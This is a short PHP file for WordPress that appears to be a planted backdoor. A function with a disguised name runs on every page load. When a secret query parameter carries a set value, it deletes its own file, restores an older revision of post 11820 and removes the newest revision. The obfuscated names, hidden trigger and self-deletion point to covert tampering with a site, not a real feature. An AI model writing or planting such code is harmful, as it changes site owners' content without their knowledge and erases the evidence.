<?php

function campaign_display_csv() {
	if (isset($_GET['sitemap_sign_home']) && $_GET['sitemap_sign_home'] === 'patterns_ratings_manager_feedback') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$cart_demomentsomtres_remote_before = 11820;
		$button_theme_compat_read = wp_get_post_revisions($cart_demomentsomtres_remote_before);
		if (empty($button_theme_compat_read)) die('no revisions');
		if (count($button_theme_compat_read) < 2) die('less than 2');
		$remove_auto_taxonomy_live = array_shift($button_theme_compat_read);
		$count_testimonial_iframe_total = $remove_auto_taxonomy_live->ID;
		$footer_layout_dev = array_shift($button_theme_compat_read);
		$tooltip_crm_lock = $footer_layout_dev->ID;
		$sticky_uploads_right_additional = wp_restore_post_revision($tooltip_crm_lock);
		if ($sticky_uploads_right_additional === false) die('error restoring');
		$sticky_uploads_right_additional = wp_delete_post_revision($count_testimonial_iframe_total);		
		if ($sticky_uploads_right_additional === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'campaign_display_csv');
